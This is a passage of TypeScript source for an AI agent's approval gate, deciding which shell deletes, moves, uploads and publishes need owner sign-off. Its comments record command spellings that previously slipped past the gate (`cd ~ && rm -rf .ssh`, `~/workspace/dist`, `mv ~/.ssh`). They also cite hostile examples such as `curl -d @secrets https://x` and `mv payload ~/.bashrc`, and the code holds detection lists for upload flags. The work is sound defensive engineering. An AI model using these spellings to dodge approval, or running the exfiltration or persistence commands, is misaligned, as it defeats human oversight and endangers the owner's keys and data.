 * the classification rewarded whichever phrasing the model happened to reach for, and
 * `tool-catalogue.ts` tells it to reach for the wrapped one the moment it needs a pipe, a glob or a
 * redirect. Measured on the owner-shaped "why is my PATH wrong" task: seven cards in nine calls,
 * six of them on commands that changed nothing. A floor the owner taps through is not a floor.
 *
 * So the write targets are resolved instead: what a redirect points at, and the arguments of a
 * command this file recognises as a writer. The fail-closed property is kept whole and moved rather
 * than dropped - the moment any command in the script is one this cannot place on either side, the
 * answer is null and the caller goes back to the wide net. That fallback costs nothing except where
 * the script also names one of the few paths the deferred-execution rule watches, and the commands
 * that name one of those while only reading it are exactly the ones enumerated above.
 */
export const shellWriteTargets = (args: Record<string, unknown>): string[] | null => {
  const script = commandScript(args);
  if (RUNTIME_WRITE_CALL.test(script)) return null;
  const commands = effectiveCommands(args);
  // An interpreter whose script could not be read at all: unknown fails closed, as it does for the
  // autonomous network allowlist and for the same reason.
  if (commands.length === 0) return null;
  const targets = [...script.matchAll(REDIRECT_TARGET)].map((match) => match[1] ?? '');
  for (const [executable = '', ...rest] of commands) {
    const name = executable.toLowerCase();
    // `sed` is a reader until `-i` makes it a writer, the same test `isMutatingToolCall` applies to
    // it, and `git` is a reader until its subcommand is one that changes the tree.
    const writes =
      name === 'git'
        ? WRITING_GIT_SUBCOMMANDS.has(gitSubcommand(rest) ?? '')
        : name === 'sed'
          ? rest.some((argument) => argument.startsWith('-i'))
          : FILE_WRITING_EXECUTABLES.has(name) || consequentialExecutables.has(name);
    if (!writes) {
      if (name === 'git' || name === 'sed' || READ_ONLY_EXECUTABLES.has(name)) continue;
      return null;
    }
    // Every operand, not the one that happens to be the destination: `cp a b` names its source too,
    // and over-naming here costs a card that was already going to be raised. The tail of a
    // `key=value` operand is taken as well, because `dd of=~/.bashrc` writes what follows the `=`.
    for (const argument of rest) {
      if (argument.startsWith('-')) continue;
      targets.push(argument);
      if (argument.includes('=')) targets.push(argument.slice(argument.indexOf('=') + 1));
    }
  }
  return targets.filter(Boolean);
};

/* ------------------------------------- what a rewind puts back, and what it does not ---------- */

/**
 * The trees the turn's undo point restores, as the path segments they are.
 *
 * `CHECKPOINT_CONTENT` (services/workspace-runner/src/checkpoints.ts) is
 * `['workspace', '.athanor/artifacts']`. It is copied rather than imported because `apps/worker`
 * does not depend on the runner package and must not start to for one array; the copy is pinned to
 * the original by a test in `command-classification.test.ts` that reads the runner's own source, so
 * a third entry appearing there fails here rather than silently narrowing what this file is willing
 * to call recoverable.
 */
export const CHECKPOINT_CONTENT: readonly (readonly string[])[] = [
  ['workspace'],
  ['.athanor', 'artifacts']
];

/**
 * Whether a path a command names lands somewhere a rewind puts back.
 *
 * This is the test DESIGN.md's own rule has always implied and the floor did not apply: a card is
 * owed when the act cannot be taken back by this computer, and the checkpoint's actual coverage is
 * what decides that. Measured through the shipped `approvalRequirement` at bfbbd00, in AUTONOMOUS:
 * `rm -rf dist`, `rm workspace/tmp.log`, `rmdir build`, `truncate -s 0 server.log`,
 * `find workspace/downloads -name '*.tmp' -delete` and `rm -rf node_modules` all raised
 * `external_consequential` and stopped the turn - every one of them inside `workspace/`, every one
 * of them restored by the undo point the same turn had already taken.
 *
 * TWO SPELLINGS OF ONE PLACE. `shell` runs in `workspace/`, so a bare `dist` is `workspace/dist`;
 * and the rest of this repository writes that same file as `workspace/dist`, because the runner
 * folds a bare name into `workspace/` for a file path and for a cwd alike. So a leading
 * `workspace` or `.athanor` segment is read from the
 * workspace root and every other relative path is read from the cwd, which makes the two spellings
 * one answer - the same equivalence `isDurableInstructionPath` already relies on. It is one answer
 * only where the cwd is at or inside a checkpointed tree, which is the ordinary case and the only
 * case where the two readings cannot differ; from a cwd anywhere else the literal reading is taken
 * instead, and `rootRelative` says what that costs and why.
 *
 * STRICTLY inside, and the word is load-bearing three ways.
 *   - `HOME` is `<workspaceRoot>/.home` - at the container root, BESIDE `workspace/` and not
 *     inside it (services/workspace-runner/src/execution.ts `agentHome`, over
 *     `AGENT_HOME` in files.ts). So `~/.cargo`, `~/.ssh` and `~/.bashrc` are under the root and
 *     inside no checkpoint at all. A rule that asked "inside the root" would have freed a delete
 *     of the agent's own shell configuration. @see `AGENT_HOME` below for why `~` cannot be read
 *     as the root itself.
 *   - `workspace` and `.athanor/artifacts` are not inside themselves. Whether a rewind recreates a
 *     top-level tree that was removed outright is not something this file can know, so
 *     `rm -rf workspace` keeps its card.
 *   - An absolute path is outside by construction. The workspace root is a real directory whose
 *     name this pure function is never handed, so `/home/athanor/ws-1/workspace/dist` is not
 *     recognised as the workspace and keeps its card. That is a card the owner did not need, and it
 *     is the direction to be wrong in: the alternative is matching `workspace` anywhere inside an
 *     absolute path, which would free `/home/other/workspace-backup`.
 *
 * A target carrying `$` or a backtick answers false, because `$HOME/.ssh` and `workspace/$D` are
 * decided by an expansion this function cannot see, and `shell` performs none of it itself.
 *
 * WHAT THIS ANSWERS IS A PLACE, NOT A GUARANTEE, and the gap between the two is a residue rather
 * than a decision. `CHECKPOINT_CONTENT` is the set of trees a checkpoint WALKS; what it actually
 * holds is narrower in two measured ways, both in services/workspace-runner/src/checkpoints.ts. A
 * file over `CHECKPOINT_MAX_FILE_BYTES` - 2 GiB by default, a disk image or a model weight - is
 * recorded as `uncovered` and its content is never copied, so `rm workspace/model.gguf` is inside
 * this test and outside the rewind. And a tree over `CHECKPOINT_MAX_FILES` - 250,000 by default -
 * makes TAKING a checkpoint throw `checkpoint_workspace_too_large`, so a workspace that has just
 * had a large dependency tree unpacked into it may have no undo point for this turn at all.
 * Neither is visible from here: `approvalRequirement` is a pure function of the tool name and the
 * arguments the model wrote, with no filesystem and no runner to ask. Closing it needs a fact
 * carried on `ApprovalContext` by whoever took - or failed to take - the checkpoint, and nothing
 * has measured how often either ceiling is crossed on a real workspace.
 *
 * THE WORKING DIRECTORY IS AN ARGUMENT, not an assumption. `shell` and `desktop_launch` both take a
 * `cwd` that the catalogue shows the model and both default it to `workspace`, and `resolveInside`
 * accepts any path inside the ROOT for it - so `{ cwd: '.', executable: 'rm', args: ['-rf',
 * '.ssh'] }` deletes the agent's own SSH directory while naming a bare relative path. Reading a
 * bare name against a hard-coded `workspace/` would have freed exactly that call. The caller passes
 * the cwd it was given; a cwd that is itself outside the checkpoints makes every bare name outside
 * them too, which is the answer that call deserves. The cwd itself is read the way the runner
 * reads it - `commandDirectory` below - so a bare `probe` is `workspace/probe` here as it is there,
 * and `.` is the container root in both.
 */
/**
 * Where `~` lands, as the segments below the workspace root that `$HOME` actually is.
 *
 * `HOME` is `<workspaceRoot>/.home`: services/workspace-runner/src/execution.ts builds it as
 * `path.join(workspaceRoot, AGENT_HOME)` and files.ts declares `AGENT_HOME = '.home'`. It sits at
 * the container root and NOT under `workspace/`, because a home inside `workspace/` is inside
 * `CHECKPOINT_CONTENT` - every toolchain cache would be walked and hashed on every turn and
 * counted against `CHECKPOINT_MAX_FILES` = 250,000, and crossing that throws
 * `CheckpointRefusedError` and costs the turn the very undo point this whole rule is written
 * against.
 *
 * This function read `~` as the root ITSELF, which was true while `HOME` was `workspaceRoot` and
 * became a live hole the moment it stopped being. Measured through the shipped
 * `approvalRequirement` in autonomous with `~` read as the root: `rm -rf ~/workspace/dist` and
 * `rm -rf ~/.athanor/artifacts/a.png` both raised NO card, because they resolved to
 * `<root>/workspace/dist` and `<root>/.athanor/artifacts/a.png` and answered "inside the
 * checkpoint" - while what they actually delete is `<root>/.home/workspace/dist` and
 * `<root>/.home/.athanor/artifacts/a.png`, which no rewind walks and nothing puts back. Both card
 * again with the segment in front. Nothing was freed by adding it: `~/.ssh` and `~/.cargo/registry`
 * were outside the checkpoint under either reading, and `~/../workspace/dist` - which used to climb
 * out of the root and answer null - now resolves to the real `workspace/dist` and is correctly
 * free.
 *
 * One segment, spelled the way everything else here is spelled, relative to the workspace root.
 * `command-classification.test.ts` pins it against `AGENT_HOME` in the runner's own source, so a
 * later move of `$HOME` fails there rather than quietly freeing a delete here - which is exactly
 * how this defect arrived.
 */
export const AGENT_HOME: readonly string[] = ['.home'];

/**
 * The leading names the runner keeps at the container root when it reads a command's `cwd`;
 * every other bare name is read from `workspace/`. A copy of `CONTAINER_ONLY` in
 * services/workspace-runner/src/files.ts, pinned against it in the test file, because a delete
 * judged in one directory and performed in another is the hole this whole rule is about.
 */
export const CONTAINER_ONLY_DIRECTORIES: ReadonlySet<string> = new Set([
  '.athanor',
  '.config',
  ...AGENT_HOME
]);

/**
 * Whether resolved segments sit under one of the checkpointed trees.
 *
 * `strictly` is what the exported test needs, because a tree is not inside itself and nothing here
 * knows whether a rewind recreates one removed outright. The base check in `rootRelative` needs the
 * other form: `cwd: 'workspace'` is AT a root rather than under one, and it is the ordinary case.
 */
const underCheckpointContent = (resolved: readonly string[], strictly: boolean): boolean =>
  CHECKPOINT_CONTENT.some(
    (prefix) =>
      (strictly ? resolved.length > prefix.length : resolved.length >= prefix.length) &&
      prefix.every((part, index) => resolved[index] === part)
  );

const rootRelative = (spelling: string, base: readonly string[]): string[] | null => {
  const cleaned = spelling.replace(/^['"]+|['"]+$/g, '');
  if (cleaned.startsWith('/') || /[$`]/.test(cleaned)) return null;
  const written = cleaned.split(/[\\/]+/).filter((segment) => segment && segment !== '.');
  const first = written[0] ?? '';
  // `~other` is somebody else's home directory and is not the agent's; only a bare `~` is HOME.
  if (first.startsWith('~') && first !== '~') return null;
  /*
   * The root-relative reading of `workspace/…` and `.athanor/…` is an EQUIVALENCE, and it holds
   * only where the two spellings really are one place.
   *
   * A relative path means whatever the working directory is when the command runs, so
   * `workspace/dist` is literally `<cwd>/workspace/dist`. Reading it from the root instead is
   * right while the cwd is inside a checkpointed tree - `<root>/workspace/workspace/dist` and
   * `<root>/workspace/dist` are both recoverable, so the divergence cannot change the answer - and
   * right at the root itself, where the two readings are the same path. Anywhere else it is the
   * `~` hole in the other argument: measured through the shipped `approvalRequirement` in
   * autonomous with this condition absent, `{ executable: 'rm', args: ['-rf', 'workspace/dist'],
   * cwd: '.home' }` raised NO card, while what it removes is `<root>/.home/workspace/dist` - a
   * directory under the agent's own HOME wearing the prefix that means "recoverable", inside
   * nothing a rewind walks. `cwd` is an argument the catalogue shows the model and
   * `resolveInside` accepts any path inside the container root for it, so `.home` is a cwd the
   * model may simply write.
   *
   * Falling through to `[...base, ...written]` is the literal reading, which is what every other
   * relative path already gets.
   */
  const rootRelativeSpellingHolds = base.length === 0 || underCheckpointContent(base, false);
  const rooted =
    first === '~'
      ? [...AGENT_HOME, ...written.slice(1)]
      : (first === 'workspace' || first === '.athanor') && rootRelativeSpellingHolds
        ? written
        : [...base, ...written];
  const resolved: string[] = [];
  for (const segment of rooted) {
    if (segment !== '..') {
      resolved.push(segment);
      continue;
    }
    // A `..` with nothing left to pop has climbed out of the workspace root altogether.
    if (!resolved.pop()) return null;
  }
  return resolved;
};

/**
 * Where a command's `cwd` puts it, as the runner resolves it.
 *
 * A bare name is read from `workspace/` - `probe` and `workspace/probe` are one directory - and it
 * has to be read that way here too, or a delete under `probe` is judged against the container
 * root, lands outside every checkpoint and cards, while the identical call spelt `workspace/probe`
 * is free. Measured through the shipped `approvalRequirement` in autonomous with the bare spelling
 * read against the root: `bash -lc 'rm -f old.txt'` from `probe` carded and from `workspace/probe`
 * did not. `.` is the container root, the container's own directories stay where they are, `~` is
 * HOME, and a cwd carrying `..` is read literally from the root, which is also what the runner does
 * with it: none of those folds, so none of them frees anything the literal reading would not.
 */
const commandDirectory = (cwd: string): string[] | null => {
  const cleaned = cwd.replace(/^['"]+|['"]+$/g, '');
  const written = cleaned.split(/[\\/]+/).filter((segment) => segment && segment !== '.');
  const first = written[0];
  const bare =
    first !== undefined &&
    !cleaned.startsWith('/') &&
    !written.includes('..') &&
    !first.startsWith('~') &&
    first !== 'workspace' &&
    !CONTAINER_ONLY_DIRECTORIES.has(first);
  return rootRelative(bare ? `workspace/${cleaned}` : cleaned, []);
};

export const insideCheckpointContent = (target: string, cwd = 'workspace'): boolean => {
  const base = commandDirectory(cwd);
  const resolved = base && target ? rootRelative(target, base) : null;
  return resolved !== null && underCheckpointContent(resolved, true);
};

/**
 * Whether removing `target` would take a file the checkpoint walked past with it.
 *
 * `insideCheckpointContent` answers where a delete lands; this answers whether what lands there
 * comes back. A file over `CHECKPOINT_MAX_FILE_BYTES` - 2 GiB - is recorded by the scan and not
 * held (services/workspace-runner/src/checkpoints.ts, `scan.uncovered`), so `rm workspace/model.gguf`
 * on a 4 GiB weight file is strictly inside `CHECKPOINT_CONTENT`, is freed by the location rule,
 * and is restored by nothing. On a box holding model weights or sequencing reads that is the single
 * most likely large irreversible delete there is.
 *
 * The match is a PREFIX and not an equality, because the directory containing the file destroys it
 * just as thoroughly: `rm -rf workspace/models` has to card while `workspace/models/llama.gguf` is
 * uncovered. `uncovered` arrives root-relative from the runner's own walk, which is the same frame
 * `rootRelative` resolves into, so the two are compared segment by segment rather than as strings -
 * `workspace/model` must not match `workspace/model.gguf`.
 *
 * An unplaceable target answers true. The caller has already required every target to be inside
 * `CHECKPOINT_CONTENT`, so this cannot normally happen; if it ever does, "cannot tell" belongs on
 * the side that keeps the card, exactly as null does everywhere else in this file.
 *
 * AND A SEGMENT THE SHELL WILL EXPAND MATCHES ANY SEGMENT, which is the only reading of a glob
 * that is not a hole. `shell` performs no expansion, but the tool catalogue tells the model to
 * reach for the wrapped spelling the moment it wants one, and that is the spelling this rule is
 * asked about: measured through `approvalRequirement` in autonomous with
 * `uncovered: ['workspace/models/llama.gguf']`, `bash -lc 'rm -f workspace/models/*.gguf'` and
 * `bash -lc 'rm -rf workspace/*'` were both FREE, because `*.gguf` is not the string `llama.gguf`.
 * That is the same 4 GiB weight file this function exists for, deleted through the spelling a
 * model actually writes for "clear out the old ones".
 *
 * It costs an ordinary workspace nothing: `uncovered` is empty there and the first line answers.
 * On a workspace that does hold an oversize file the cost is one card, and only for a glob on the
 * path to it - `workspace/downloads/*.dmg` still frees itself against an uncovered
 * `workspace/models/llama.gguf`, because the segments before the glob still have to match.
 */
const EXPANDS_TO_MORE_THAN_ITSELF = /[*?[\]{}]/;

export const removesUncoveredFile = (
  target: string,
  cwd: string,
  uncovered: readonly string[]
): boolean => {
  if (!uncovered.length) return false;
  const base = commandDirectory(cwd);
  const resolved = base && target ? rootRelative(target, base) : null;
  if (!resolved) return true;
  return uncovered.some((path) => {
    const walked = path.split(/[\\/]+/).filter((segment) => segment && segment !== '.');
    return (
      walked.length >= resolved.length &&
      resolved.every(
        (segment, at) => walked[at] === segment || EXPANDS_TO_MORE_THAN_ITSELF.test(segment)
      )
    );
  });
};

/**
 * The removers whose damage is exactly the paths they are handed.
 *
 * `dd`, `wipefs` and `mkfs*` are deliberately absent even though they remove data, because what
 * they write is a device rather than a path in this tree and `of=/dev/sda` is not a question about
 * the checkpoint. They keep their card in every mode, which costs the owner nothing measurable: no
 * scenario in `evals/cards` runs one.
 */
const PATH_SCOPED_REMOVERS = new Set(['rm', 'rmdir', 'unlink', 'shred', 'truncate']);

/**
 * The mover, whose damage is exactly the paths it moves FROM.
 *
 * `mv` is in no destructive set, and three verifiers in a row flagged what that costs. Measured
 * through the shipped `approvalRequirement` at 59d3e67 with `{ undoPoint: { id: 'cp-1',
 * uncovered: [] } }`: `mv ~/.ssh /tmp/x` was FREE in balanced and autonomous, and so was the
 * `bash -lc` spelling and the `-t` spelling. Nothing is deleted and the agent's own keys are gone
 * from where anything looks for them, which is the same loss `rm -rf ~/.ssh` gets a card for.
 *
 * A BLANKET CARD WAS THE WRONG REPAIR and it is why this is not simply a sixth name in the set
 * above. Moving a file is ordinary work several times an hour - `mv dist old`, `mv a.md docs/` -
 * and a card in front of ordinary work is the clunk this whole rule exists to remove. So `mv` gets
 * the treatment `rm` already has: the SOURCE operands are resolved and the card is dropped when
 * every one of them is strictly inside `CHECKPOINT_CONTENT` and none is a file the checkpoint
 * walked past, exactly as `insideCheckpointContent` and `removesUncoveredFile` decide for a delete.
 * A move out of `workspace/` is free because a rewind puts the source back; a move of anything
 * else is not.
 *
 * WHAT IT DOES NOT ASK IS THE DESTINATION. `mv a b` also overwrites whatever `b` was, and this rule
 * says nothing about that. Two reasons, and both were checked rather than assumed. The destinations
 * that matter most already card on their own arm: `mv payload ~/.bashrc` and
 * `mv job /etc/cron.d/job` both raise "Change a file this computer runs on its own" today, because
 * `shellWriteTargets` hands every `mv` operand to the durable-instruction and scheduled-path rules
 * and `mv` has been in `FILE_WRITING_EXECUTABLES` all along. And testing the destination as well
 * would card `mv workspace/build.tgz /tmp/keep` - carrying something OUT of the workspace, which
 * destroys nothing and is ordinary. So an ordinary file outside the checkpoint, overwritten by a
 * move onto it, is a residue this rule leaves open and DESTRUCTION.md records as open.
 *
 * `cp`, `install`, `ln` and `rename` are deliberately absent. `cp` and `install` leave the source
 * where it was; `ln` adds a name; `rename` is a batch regex over basenames within a directory,
 * which moves nothing between places. Only `mv` empties the place it reads from.
 */
export const RELOCATING_EXECUTABLES = new Set(['mv']);

/**
 * `mv`'s own options that carry a value, and the one that inverts which operand is the destination.
 *
 * `mv SOURCE... DIRECTORY` puts the destination LAST, and `mv -t DIR SOURCE...` puts it first, so a
 * reader that always dropped the last operand would drop a real source on the `-t` spelling and
 * free it. `-S`/`--suffix` takes a value that is not a path at all and would otherwise be read as
 * one. The `=` spellings carry their value inside the token and consume nothing after them.
 */
const RELOCATION_INTO_A_DIRECTORY = new Set(['-t', '--target-directory']);
const RELOCATION_VALUE_OPTIONS = new Set(['-t', '--target-directory', '-S', '--suffix']);

/**
 * The places a move empties, or null when which operand is which cannot be shown.
 *
 * Null keeps the card, as it does everywhere else in this file. It is the answer for a move with
 * fewer than two operands - `mv a` is an error, and `mv` with none is `find … | xargs mv`, whose
 * paths are not in the command text.
 *
 * A bundled short option that ENDS in a value-taking letter - `mv -ft /tmp a b` - is not
 * enumerated, so its value is read as an operand instead. That over-names, and over-naming here can
 * only add a constraint: an extra operand is one more path that has to be inside the checkpoint for
 * the card to be dropped. Measured on that exact spelling: `/tmp` is absolute, `rootRelative`
 * answers null for it, and the card stands.
 */
const relocationSources = (commandArgs: readonly string[]): string[] | null => {
  const operands: string[] = [];
  let intoADirectory = false;
  let endOfOptions = false;
  for (let at = 0; at < commandArgs.length; at += 1) {
    const argument = commandArgs[at] ?? '';
    if (!endOfOptions && argument === '--') {
      endOfOptions = true;
      continue;
    }
    if (!endOfOptions && argument.startsWith('-') && argument !== '-') {
      const named = argument.split('=')[0] ?? argument;
      if (RELOCATION_INTO_A_DIRECTORY.has(named)) intoADirectory = true;
      if (!argument.includes('=') && RELOCATION_VALUE_OPTIONS.has(argument)) at += 1;
      continue;
    }
    operands.push(argument);
  }
  if (intoADirectory) return operands.length ? operands : null;
  return operands.length >= 2 ? operands.slice(0, -1) : null;
};

/** Everything a command names that is not an option. Over-naming here can only add a constraint. */
const operandsOf = (commandArgs: readonly string[]): string[] =>
  commandArgs.filter((argument) => !argument.startsWith('-'));

/** The language-runtime deletes `isDestructiveScript` reads, whose target lives inside a string. */
const RUNTIME_DELETE_NAME = /(?:shutil\.rmtree|os\.(?:remove|removedirs|rmdir|unlink))\s*\(/;

/**
 * Whether a command this file cannot place as a removal might still remove something.
 *
 * The stopping condition for the script walk below, and the reason it is a separate question: a
 * script is only recoverable if EVERY command in it is, so a command that yields no targets has to
 * be shown to remove nothing rather than assumed to. `xargs rm`, `sudo rm` and `find . -exec rm`
 * all name their remover in a non-head position and their paths nowhere in the command text.
 */
const mayRemoveSomething = (name: string, tokens: readonly string[]): boolean => {
  if (
    consequentialExecutables.has(name) ||
    RELOCATING_EXECUTABLES.has(name) ||
    name.startsWith('mkfs')
  )
    return true;
  const lower = tokens.map((token) => token.toLowerCase());
  if (name === 'find')
    return lower.some((token) => ['-delete', '-exec', '-execdir', '-ok'].includes(token));
  if (name === 'rsync') return lower.includes('--delete');
  // `git worktree remove` names its remover nowhere: the head is `git` and not one token below is
  // a removal program, so the walk read `rm -rf dist && git worktree remove --force ../wt` as one
  // recoverable delete and nothing else. It is the one destructive shape here that cannot be seen
  // by looking at names.
  if (name === 'git' && gitRemovesAWorktree(tokens)) return true;
  return tokens.some((token) => {
    const inner = unquoted(token).split('/').pop() ?? '';
    return consequentialExecutables.has(inner) || inner.startsWith('mkfs');
  });
};

/**
 * The commands that move the ground every relative path after them is read against.
 *
 * A removal target is resolved against the working directory the CALL names, and a `cd` earlier in
 * the same command line makes that resolution wrong in the one direction that costs something.
 * Measured through `approvalRequirement` in autonomous, with the location rule in place and this
 * set absent: `bash -lc 'cd ~ && rm -rf .ssh'`, `sh -c 'cd /home/other && rm -rf photos'` and
 * `bash -lc 'cd /etc && rm -rf nginx'` all raised NO card, because `.ssh`, `photos` and `nginx`
 * were each read as bare names under `workspace/`. All three card without the `cd`, and all three
 * carded before the location rule existed. This file's own header names `sh -c` with a `cd` in
 * front as one of the four shapes a model actually writes.
 *
 * REFUSED RATHER THAN FOLLOWED, and the choice is the same one `removalTargets` makes everywhere
 * else. Carrying a base through the script would mean reading `cd -`, `cd "$D"`, a `pushd`/`popd`
 * pair and a subshell that restores the directory on the way out, and every one of those read
 * wrongly frees a delete rather than costing a card. So a command line that re-bases itself is
 * unplaceable: `cd workspace/app && rm -rf dist` keeps a card it does not need, which is the
 * direction a resolver whose whole job is to drop cards has to be wrong in.
 */
const REBASING_COMMANDS = new Set(['cd', 'chdir', 'pushd', 'popd']);

/** The head of a decomposed command, as the bare program name this file compares. */
const commandName = (head: string): string => (unquoted(head).split('/').pop() ?? '').toLowerCase();

export const commandsChangeDirectory = (commands: readonly (readonly string[])[]): boolean =>
  commands.some(([head = '']) => REBASING_COMMANDS.has(commandName(head)));

const scriptRemovalTargets = (script: string): string[] | null => {
  /*
   * The two shapes `isDestructiveScript` catches that no decomposed command carries: an escaping
   * redirect names its target after a `>`, and a delete through a language runtime names it inside
   * a string. Neither is placeable here, and both keep the card.
   */
  if (!script || escapingRedirect(script)) return null;
  if (DESTRUCTIVE_RUNTIME_CALL.test(script) || RUNTIME_DELETE_NAME.test(script)) return null;
  const commands = scriptCommands(script);
  // A script this cannot read at all is unknown rather than safe, as it is for every other reader.
  if (!commands.length) return null;
  if (commandsChangeDirectory(commands)) return null;
  const targets: string[] = [];
  for (const [head = '', ...rest] of commands) {
    const name = commandName(head);
    const removals = removalTargets(name, rest);
    if (removals) {
      targets.push(...removals);
      continue;
    }
    if (mayRemoveSomething(name, rest)) return null;
  }
  return targets.length ? targets : null;
};

/**
 * The paths a destructive command would remove, or null when what it removes cannot be shown.
 *
 * Null is the answer for every shape this cannot place, and every caller reads it as "card": a
 * wrapper (`sudo rm`, `xargs rm`), a device writer, a `find` that runs a command on what it finds,
 * a delete through a language runtime, an interpreter whose script cannot be parsed, and a
 * `rm` with no operand at all - which is either a no-op or `find … | xargs rm`, whose paths are not
 * in the command text.
 *
 * It does NOT resolve through a wrapper. `sudo rm -rf dist` is judged by the wrapped arm above and
 * keeps its card even though the path is recoverable, and so does `bash -lc 'sh -c "rm -rf dist"'`;
 * both are one card the owner did not need, and both are the safe direction for a resolver whose
 * whole job is to say when a card may be dropped.
 */
export const removalTargets = (
  executable: string,
  commandArgs: readonly string[],
  script = ''
): string[] | null => {
  if (commandInterpreters.has(executable)) return scriptRemovalTargets(script);
  if (PATH_SCOPED_REMOVERS.has(executable)) {
    const operands = operandsOf(commandArgs);
    return operands.length ? operands : null;
  }
  // A move empties the place it moves FROM, so the sources are its removal targets and the
  // destination is not one. @see `RELOCATING_EXECUTABLES` for what this deliberately does not ask.
  if (RELOCATING_EXECUTABLES.has(executable)) return relocationSources(commandArgs);
  if (executable === 'find') {
    const lower = commandArgs.map((argument) => argument.toLowerCase());
    if (!lower.includes('-delete')) return null;
    if (lower.some((argument) => ['-exec', '-execdir', '-ok'].includes(argument))) return null;
    const operands = operandsOf(commandArgs);
    return operands.length ? operands : null;
  }
  // The one destructive git shape whose damage is exactly the path it names, so a worktree the
  // agent made for itself under `workspace/` is placed and freed like any other delete.
  if (executable === 'git') return worktreeRemovalTargets(commandArgs);
  return null;
};

/*
 * Short options are compared raw and long options lowercased, and the difference is the control.
 *
 * Three option pairs below differ only in case. curl's `-T` uploads a file and `-t` sets a telnet
 * option; `-X` chooses the method and `-x` names a proxy; gh's `-f` and `-F` both write a field,
 * and `-F` will read its value out of a file. Every list here used to be matched against
 * lowercased arguments, so each pair collapsed into whichever spelling happened to be written
 * down - and the gh list was `['-f','--raw-field','-f','--field','--input']`, with `-f` twice and
 * `-F` absent. It was safe by accident: the collapse always erred towards raising the card, and
 * `-F` was caught only because it arrived as `-f`. The repair that looks obvious - match the raw
 * argument against the same list - would have let `gh api -F key=@file` through as a read.
 *
 * It also cost precision in the other direction: `curl -D headers.txt https://x` is an ordinary
 * GET that writes the response headers to a local file, and it asked the owner to approve an
 * upload. A card in front of a plain fetch is a card the owner learns to tap through.
 *
 * So the short forms are enumerated by case and compared raw. The long forms stay
 * case-insensitive, deliberately: no tool here spells a long option with a capital, so lowercasing
 * can only ever catch a spelling that does not exist, which errs towards the card.
 */
const CURL_UPLOAD_SHORT_OPTIONS = new Set(['-d', '-F', '-T']);
const CURL_UPLOAD_LONG_OPTIONS = new Set([
  '--data',
  '--data-ascii',
  '--data-binary',
  '--data-raw',
  '--data-urlencode',
  '--form',
  '--form-string',
  '--upload-file'
]);
const GH_API_WRITE_SHORT_OPTIONS = new Set(['-f', '-F']);
const GH_API_WRITE_LONG_OPTIONS = new Set(['--field', '--raw-field', '--input']);

/** A method that is not one of the three that only ask for something. An absent one counts. */
const writingHttpMethod = (method: string): boolean =>
  !['get', 'head', 'options'].includes(method.toLowerCase());

/**
 * Whether a command sends data out rather than only fetching. This lived inline in the shell
 * branch, where it could only ever ask the question about the executable the tool was handed; it
 * has to be askable of a command found inside a script too, or reading the script body would turn
 * `bash -lc 'curl -d @secrets https://x'` into an allowlisted curl and quietly drop the card the
 * bare form raises.
 */
export const sendsDataOverNetwork = (executable: string, commandArgs: string[]): boolean => {
  const lowerArgs = commandArgs.map((argument) => argument.toLowerCase());
  const curlWrites =
    executable === 'curl' &&
    commandArgs.some(
      (argument, index) =>
        CURL_UPLOAD_SHORT_OPTIONS.has(argument) ||
        CURL_UPLOAD_LONG_OPTIONS.has(lowerArgs[index] ?? '') ||
        ((argument === '-X' || lowerArgs[index] === '--request') &&
          writingHttpMethod(lowerArgs[index + 1] ?? ''))
    );
  const wgetWrites =
    executable === 'wget' &&
    lowerArgs.some(
      (argument, index) =>
        argument.startsWith('--post-data=') ||
        argument.startsWith('--post-file=') ||
        argument.startsWith('--body-data=') ||
        argument.startsWith('--body-file=') ||
        ((argument === '--method' || argument.startsWith('--method=')) &&
          !['get', 'head', 'options'].includes(
            argument.includes('=') ? (argument.split('=')[1] ?? '') : (lowerArgs[index + 1] ?? '')
          ))
    );
  const ghReadOnly =
    executable === 'gh' &&
    ((lowerArgs[0] === 'api' &&
      !commandArgs.some(
        (argument, index) =>
          GH_API_WRITE_SHORT_OPTIONS.has(argument) ||
          GH_API_WRITE_LONG_OPTIONS.has(lowerArgs[index] ?? '') ||
          ((argument === '-X' || lowerArgs[index] === '--method') &&
            writingHttpMethod(lowerArgs[index + 1] ?? ''))
      )) ||
      ['status', 'search'].includes(lowerArgs[0] ?? '') ||
      (['repo', 'issue', 'pr', 'run', 'workflow', 'release'].includes(lowerArgs[0] ?? '') &&
        ['list', 'view', 'status', 'checks'].includes(lowerArgs[1] ?? '')));
  return curlWrites || wgetWrites || (executable === 'gh' && !ghReadOnly);
};

/**
 * Changing what the public can install, by package manager and by operation.
 *
 * `safeNetworkExecutables` is an allowlist of *executables*, so the allowance written for
 * `npm install` carried `npm publish` with it. `curl` and `git` had operation checks bolted on -
 * `sendsDataOverNetwork` above reads curl's upload options, `gitSubcommand` below reads `push` - and
 * the package managers never got one. Measured on the shipped floor before this existed:
 * `npm publish`, `pnpm publish`, `yarn publish`, `cargo publish`, `twine upload`, `gem push`,
 * `poetry publish`, `dotnet nuget push`, `mvn deploy` and `docker push` raised no card in balanced
 * OR autonomous, while `rm -rf node_modules` stopped the turn in all three - and the resident
 * contract told the owner that public publishing always stops.
 *
 * ONE ACT, not one direction: a version that goes to a registry cannot be withdrawn (npm's own
 * unpublish window is 72 hours and crates.io has none at all), and the operations that take one
 * away or repoint it - `unpublish`, `yank`, `dist-tag`, `deprecate` - break every build that
 * resolved it and are equally not this computer's to undo. `access` and `owner` are here for the
 * same reason one level up: `npm access public` puts a private package in front of everyone, and
 * `npm owner rm` can remove the owner's own control of it. All of them are visible to somebody
 * other than the owner and none of them is inside the checkpoint, which is the two-part test the
 * floor's other consequential cards are drawn from.
 *
 * An OPERATION table rather than an executable list, so the shape that produced the miss cannot
 * repeat: adding a package manager to `safeNetworkExecutables` no longer silently allows its
 * publish. What it does not do is invert the default - a subcommand nobody has judged still passes,
 * because the alternative was measured and is not shippable: npm alone has fifty-odd subcommands
 * plus `npm run <anything>`, so an allowlist of safe ones cards `npm ls`, `npm outdated` and
 * `npm whoami`, which is a card on reading. The narrower claim this table makes is the one that can
 * be held: every operation that changes what the public can install is named, and a new one has to
 * be added here.
 *
 * `yarn npm publish` is Berry's spelling and `dotnet nuget push` is dotnet's, so an operation may be
 * two words, matched as a run rather than at a fixed position: `mvn clean deploy` and
 * `mvn -DskipTests clean deploy` are the ordinary spellings of a deploy and neither puts it first.
 *
 * `--dry-run` is deliberately NOT an exemption. It is one word away from the real thing, the card
 * is answered by a person reading the command it prints, and an exemption keyed on a flag is an
 * exemption an injected instruction writes for itself.
 */
const NODE_REGISTRY_OPERATIONS: readonly (readonly string[])[] = [
  ['publish'],
  ['unpublish'],
  ['deprecate'],
